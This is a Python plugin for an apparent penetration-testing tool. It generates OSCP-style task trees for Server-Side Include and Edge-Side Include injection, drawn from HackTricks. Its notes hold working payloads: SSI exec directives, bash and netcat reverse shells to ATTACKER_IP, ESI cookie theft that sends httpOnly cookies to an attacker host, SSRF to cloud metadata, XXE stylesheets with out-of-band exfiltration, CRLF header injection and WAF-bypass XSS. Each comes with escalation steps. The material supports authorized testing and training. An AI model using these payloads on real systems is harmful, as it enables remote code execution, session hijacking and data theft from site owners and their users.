"""
Server-Side Inclusion (SSI) and Edge-Side Inclusion (ESI) exploitation plugin

Generates tasks for SSI/ESI injection attacks including:
- SSI directive detection and exploitation
- ESI tag injection for XSS and SSRF
- Cookie theft bypassing httpOnly
- XSLT injection leading to XXE
- Cache poisoning via ESI

Extracted from HackTricks: server-side-inclusion-edge-side-inclusion-injection.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ServerSideInclusionPlugin(ServicePlugin):
    """Server-Side Inclusion and Edge-Side Inclusion exploitation plugin"""

    @property
    def name(self) -> str:
        return "server-side-inclusion"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect HTTP services that may use SSI/ESI"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SSI/ESI exploitation task tree"""

        url = f"http://{target}:{port}" if port != 443 else f"https://{target}:{port}"

        tasks = {
            'id': f'ssi-esi-enum-{port}',
            'name': f'SSI/ESI Injection Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: SSI Detection
        tasks['children'].append({
            'id': f'ssi-detection-{port}',
            'name': 'Server-Side Includes (SSI) Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'ssi-file-ext-{port}',
                    'name': 'Check for SSI File Extensions',
                    'type': 'command',
                    'metadata': {
                        'command': f'gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x shtml,shtm,stm',
                        'description': 'Search for SSI-enabled files (.shtml, .shtm, .stm)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'dir': 'Directory/file brute-forcing mode',
                            '-u': 'Target URL',
                            '-w': 'Wordlist for enumeration',
                            '-x': 'File extensions to append (SSI files: .shtml, .shtm, .stm)'
                        },
                        'success_indicators': [
                            'Files with .shtml, .shtm, or .stm extensions discovered',
                            'Status 200 responses on SSI files'
                        ],
                        'failure_indicators': [
                            'No SSI files found (may not use SSI)',
                            '403 Forbidden on all SSI extensions'
                        ],
                        'next_steps': [
                            'Test discovered SSI files for injection points',
                            'Check if user input is reflected in SSI context',
                            'Attempt SSI directive injection'
                        ],
                        'alternatives': [
                            f'Manual: curl {url}/index.shtml',
                            f'Manual: Browse site and check page sources for SSI directives',
                            'ffuf -u {url}/FUZZ -w wordlist.txt -e .shtml,.shtm,.stm'
                        ],
                        'notes': '''SSI files indicate server-side includes are enabled. Common extensions:
- .shtml (most common)
- .shtm
- .stm

SSI allows embedding directives in HTML that execute server-side before response.'''
                    }
                },
                {
                    'id': f'ssi-injection-test-{port}',
                    'name': 'Test SSI Directive Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test common SSI injection vectors in user input',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': '''SSI Injection Test Payloads (inject in parameters, forms, headers):

**Basic Detection:**
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DATE_LOCAL" -->

**File Inclusion via SSI:**
<!--#include virtual="/etc/passwd" -->
<!--#include file="../../../../etc/passwd" -->

**Command Execution:**
<!--#exec cmd="whoami" -->
<!--#exec cmd="id" -->
<!--#exec cmd="ls -la" -->

**Reverse Shell via SSI:**
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" -->
<!--#exec cmd="mkfifo /tmp/foo;nc ATTACKER_IP 4444 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

**Information Disclosure:**
<!--#printenv -->  (prints all environment variables)

**Variable Manipulation:**
<!--#set var="name" value="attacker" -->
<!--#echo var="name" -->

**Testing Methodology:**
1. Find reflection point (search box, comment field, URL parameter)
2. Inject: <!--#echo var="DATE_LOCAL" -->
3. Check if directive executes (date appears in response)
4. Escalate to RCE with #exec cmd

**Common Injection Points:**
- URL parameters: ?page=<!--#exec cmd="id" -->
- POST body fields
- HTTP headers (User-Agent, Referer)
- File upload filenames
- Comment fields''',
                        'success_indicators': [
                            'SSI directive executed (DATE_LOCAL displays current date)',
                            'Command output visible in response',
                            'Environment variables leaked'
                        ],
                        'failure_indicators': [
                            'Directive rendered as plain text (SSI disabled or filtered)',
                            'HTML entity encoding applied (< becomes &lt;)',
                            'WAF blocks <!-- or --> characters'
                        ],
                        'next_steps': [
                            'If detection successful: Attempt command execution',
                            'Try #exec cmd for RCE',
                            'Use #include to read sensitive files',
                            'Establish reverse shell'
                        ],
                        'alternatives': [
                            'Burp Intruder with SSI payload list',
                            'Manual testing in browser dev tools',
                            'OWASP ZAP active scanner with SSI checks'
                        ]
                    }
                }
            ]
        })

        # Task 2: ESI Detection and Exploitation
        tasks['children'].append({
            'id': f'esi-detection-{port}',
            'name': 'Edge-Side Includes (ESI) Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'esi-header-check-{port}',
                    'name': 'Check for ESI Response Headers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I {url}/ | grep -i "Surrogate-Control\\|ESI"',
                        'description': 'Check for ESI indicators in HTTP response headers',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-I': 'HEAD request (fetch headers only, no body)',
                            'grep -i': 'Case-insensitive search for ESI headers',
                            'Surrogate-Control': 'Header indicating ESI support',
                            'ESI': 'Edge Side Includes version identifier'
                        },
                        'success_indicators': [
                            'Surrogate-Control: content="ESI/1.0" header present',
                            'X-ESI header present',
                            'Via header mentions cache/proxy (Varnish, Akamai, Fastly)'
                        ],
                        'failure_indicators': [
                            'No ESI-related headers found',
                            'Direct origin server (no caching layer)'
                        ],
                        'next_steps': [
                            'If ESI detected: Test for ESI injection vulnerabilities',
                            'Check if user input reflected in cacheable responses',
                            'Attempt blind ESI injection'
                        ],
                        'alternatives': [
                            f'Manual: Check response headers in Burp Suite',
                            f'Browser: Open DevTools > Network > Check headers',
                            f'nmap --script http-headers -p {port} {target}'
                        ],
                        'notes': '''ESI is used by CDNs/caching proxies (Varnish, Akamai, Fastly) to cache dynamic content.

Common ESI Software:
- Varnish Cache
- Akamai
- Fastly
- Squid3
- NodeJS ESI libraries

Even without Surrogate-Control header, server may still process ESI tags.'''
                    }
                },
                {
                    'id': f'esi-injection-basic-{port}',
                    'name': 'Test Basic ESI Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for ESI tag injection in user-controlled input',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                        'notes': '''ESI Injection Test Payloads:

**Basic Detection (reflected test):**
hell<!--esi-->o
If output is "hello" â†’ ESI processing active

**Blind Detection (OAST):**
<esi:include src=http://ATTACKER.burpcollaborator.net>
Check for HTTP request to your server

**XSS via ESI:**
<esi:include src=http://ATTACKER_IP/xss.html>

Create xss.html on attacker server:
<script>alert(document.domain)</script>

**Cookie Theft (bypasses httpOnly flag!):**
<esi:include src=http://ATTACKER_IP/steal?c=$(HTTP_COOKIE)>

**SSRF via ESI:**
<esi:include src=http://127.0.0.1:8080/admin>
<esi:include src=http://169.254.169.254/latest/meta-data/>  (AWS metadata)

**Private File Disclosure:**
<esi:include src="supersecret.txt">
<esi:include src="/etc/passwd">

**Akamai Debug Information:**
<esi:debug/>

**WAF Bypass:**
<scr<!--esi-->ipt>alert(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>

**Testing Workflow:**
1. Find reflection point in cached responses
2. Inject: hell<!--esi-->o
3. Check if "hello" rendered (ESI active)
4. Escalate to XSS, cookie theft, or SSRF

**High-Value Targets:**
- Search queries reflected in results
- User profile fields cached by CDN
- Error messages with user input''',
                        'success_indicators': [
                            'ESI tag processed (hell<!--esi-->o becomes "hello")',
                            'External resource fetched (OAST callback)',
                            'Cookie exfiltrated to attacker server',
                            'Private files disclosed in response'
                        ],
                        'failure_indicators': [
                            'ESI tags rendered as plain text',
                            'HTML entity encoding applied',
                            'WAF blocks <esi: syntax'
                        ],
                        'next_steps': [
                            'If XSS achieved: Steal credentials, session tokens',
                            'If SSRF possible: Scan internal network, access cloud metadata',
                            'If file disclosure works: Read application config files',
                            'Attempt ESI + XSLT for XXE'
                        ],
                        'alternatives': [
                            'Burp Suite Collaborator for blind detection',
                            'ngrok/Beeceptor for HTTP callbacks',
                            'Manual testing with netcat listener'
                        ]
                    }
                },
                {
                    'id': f'esi-advanced-{port}',
                    'name': 'Advanced ESI Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'esi-var-bypass-{port}',
                            'name': 'ESI Variable-Based XSS Filter Bypass',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use ESI variables to bypass client-side XSS filters',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT'],
                                'notes': '''Chrome XSS Filter Bypass (if client filter active):

<esi:assign name="var1" value="'cript'"/>
<s<esi:vars name="$(var1)"/>>alert(/XSS/);</s<esi:vars name="$(var1)"/>>

Result: <script>alert(/XSS/);</script>

**How it works:**
- ESI variables split dangerous keywords
- Client XSS filter doesn't detect pattern
- Server-side ESI reconstructs payload

Only works on ESI implementations supporting <esi:vars> (Squid3, Akamai, NodeJS ESI).''',
                                'success_indicators': [
                                    'XSS executes despite client filter',
                                    'ESI variables expanded in response'
                                ],
                                'failure_indicators': [
                                    'ESI vars not supported (Varnish, Fastly)',
                                    'WAF blocks <esi:assign>'
                                ],
                                'alternatives': [
                                    'Standard XSS if no client filter active',
                                    'DOM-based XSS to bypass server filters'
                                ]
                            }
                        },
                        {
                            'id': f'esi-xxe-{port}',
                            'name': 'ESI + XSLT for XXE',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Chain ESI with XSLT to achieve XXE vulnerability',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT'],
                                'notes': '''ESI XSLT Injection Leading to XXE:

**Step 1: Create malicious XSLT file (host on attacker server):**
File: xxe.xsl
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body><h1>&xxe;</h1></body></html>
  </xsl:template>
</xsl:stylesheet>

**Step 2: Create XML file:**
File: poc.xml
<?xml version="1.0"?>
<foo>bar</foo>

**Step 3: Inject ESI payload:**
<esi:include src="http://ATTACKER_IP/poc.xml" dca="xslt" stylesheet="http://ATTACKER_IP/xxe.xsl" />

**Result:** /etc/passwd content reflected in response.

**Advanced: OOB XXE for blind exfiltration:**
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">
%dtd;

**Requirements:**
- ESI implementation supporting XSLT (rare)
- XML parser with DTD processing enabled
- Ability to reference external resources''',
                                'success_indicators': [
                                    'XXE payload executes',
                                    'File content exfiltrated',
                                    'SSRF to internal services successful'
                                ],
                                'failure_indicators': [
                                    'XSLT not supported by ESI engine',
                                    'XML parser has DTD disabled',
                                    'External entity loading blocked'
                                ],
                                'next_steps': [
                                    'If XXE works: Read sensitive files (/etc/shadow, app configs)',
                                    'Use OOB XXE for blind exfiltration',
                                    'SSRF to internal network services'
                                ],
                                'alternatives': [
                                    'Direct XXE if XML endpoints discovered',
                                    'SSRF via ESI without XSLT'
                                ]
                            }
                        },
                        {
                            'id': f'esi-header-injection-{port}',
                            'name': 'ESI Header Injection (CRLF)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Inject HTTP headers via ESI request_header directive',
                                'tags': ['OSCP:LOW', 'ADVANCED'],
                                'notes': '''ESI Header Injection Techniques:

**Add Custom Header to ESI Request:**
<esi:include src="http://victim.com/api">
  <esi:request_header name="User-Agent" value="AttackerBot"/>
</esi:include>

**CRLF Injection (CVE-2019-2438):**
<esi:include src="http://victim.com/api">
  <esi:request_header name="User-Agent" value="Mozilla/5.0
Host: evil.com
X-Forwarded-For: 127.0.0.1"/>
</esi:include>

Result: Injects multiple headers via CRLF (\\r\\n)

**Add Response Header (bypass Content-Type restrictions):**
<!--esi/$add_header('Content-Type','text/html')/-->

Use case: JSON endpoint returns XSS but Content-Type is text/json.
Change to text/html to execute XSS.

**Open Redirect via ESI:**
<!--esi $add_header('Location','http://evil.com') -->

**Combined Attack:**
<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode('"><svg/onload=alert(1)>')/-->''',
                                'success_indicators': [
                                    'Headers successfully injected',
                                    'CRLF allows header splitting',
                                    'Content-Type changed to enable XSS'
                                ],
                                'failure_indicators': [
                                    'Header injection filtered/sanitized',
                                    'CRLF characters stripped',
                                    'ESI implementation lacks request_header support'
                                ],
                                'alternatives': [
                                    'HTTP Request Smuggling for header injection',
                                    'Host header injection attacks'
                                ]
                            }
                        }
                    ]
                }
            ]
        })

        # Task 3: ESI Implementation-Specific Exploitation
        tasks['children'].append({
            'id': f'esi-implementation-{port}',
            'name': 'ESI Implementation Fingerprinting',
            'type': 'manual',
            'metadata': {
                'description': 'Identify ESI software and tailor attacks',
                'tags': ['OSCP:MEDIUM', 'ENUM'],
                'notes': '''ESI Implementation Detection:

**Check HTTP Headers:**
- Via: 1.1 varnish (Varnish Cache)
- Server: AkamaiGHost (Akamai)
- X-Fastly-Request-ID (Fastly)
- X-Cache: HIT from squid (Squid3)

**Feature Support by Implementation:**

1. **Squid3**
   - Supports: <esi:include>, <esi:vars>, cookies
   - Requires: Upstream app sends ESI headers
   - Host Allowlist: No
   - Attack: Cookie theft, SSRF, XSS

2. **Varnish Cache**
   - Supports: <esi:include> only
   - No vars, no cookies
   - Requires: Upstream headers
   - Host Allowlist: Yes (SSRF limited)
   - Attack: XSS, limited SSRF

3. **Fastly**
   - Supports: <esi:include>
   - No upstream headers required
   - Host Allowlist: Yes
   - Attack: XSS, constrained SSRF

4. **Akamai**
   - Supports: <esi:include>, <esi:vars>, cookies
   - No upstream headers required
   - <esi:debug/> supported!
   - Attack: Full exploitation, debug info leak

5. **NodeJS ESI Libraries**
   - Supports: All features
   - No restrictions
   - Attack: Full exploitation

**Testing Strategy:**
1. Identify implementation via headers
2. Test feature support (vars, cookies)
3. Tailor payload to supported features
4. Check host allowlist restrictions''',
                'success_indicators': [
                    'ESI implementation identified',
                    'Feature support mapped',
                    'Exploitation tailored to capabilities'
                ],
                'failure_indicators': [
                    'Unable to identify ESI software',
                    'All ESI features blocked'
                ],
                'next_steps': [
                    'Use Akamai <esi:debug/> if Akamai detected',
                    'Focus on XSS if Varnish/Fastly (no vars)',
                    'Attempt cookie theft if Squid3/Akamai/NodeJS'
                ],
                'alternatives': [
                    'Trial-and-error testing all payloads',
                    'Burp Suite extension for ESI detection'
                ]
            }
        })

        # Task 4: Wordlist-Based Detection
        tasks['children'].append({
            'id': f'ssi-esi-wordlist-{port}',
            'name': 'Automated SSI/ESI Fuzzing',
            'type': 'command',
            'metadata': {
                'command': f'wfuzz -c -z file,/usr/share/wordlists/SecLists/Fuzzing/ssi-esi-injection.txt -u {url}/page?input=FUZZ --hw 0',
                'description': 'Fuzz for SSI/ESI injection points with specialized wordlist',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'NOISY'],
                'flag_explanations': {
                    '-c': 'Colorized output',
                    '-z file,WORDLIST': 'Use file-based payload source',
                    '-u': 'Target URL with FUZZ marker',
                    '--hw 0': 'Hide responses with 0 words (filter out empty responses)'
                },
                'success_indicators': [
                    'SSI/ESI payloads trigger different response sizes',
                    'Command execution detected in responses',
                    'External HTTP requests to attacker server'
                ],
                'failure_indicators': [
                    'All payloads return identical responses',
                    'WAF blocks all SSI/ESI syntax',
                    'No injection point found'
                ],
                'next_steps': [
                    'Manually verify positive findings',
                    'Escalate successful injections to RCE',
                    'Document working payloads'
                ],
                'alternatives': [
                    'Burp Intruder with custom SSI/ESI payloads',
                    'ffuf -u URL/page?input=FUZZ -w payloads.txt',
                    'Manual testing with curl/browser'
                ],
                'notes': '''SecLists SSI/ESI wordlist location (if not found, download):
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt

Custom payload list for OSCP:
<!--#exec cmd="id" -->
<!--#echo var="DATE_LOCAL" -->
<esi:include src=http://ATTACKER_IP/>
hell<!--esi-->o'''
            }
        })

        return tasks
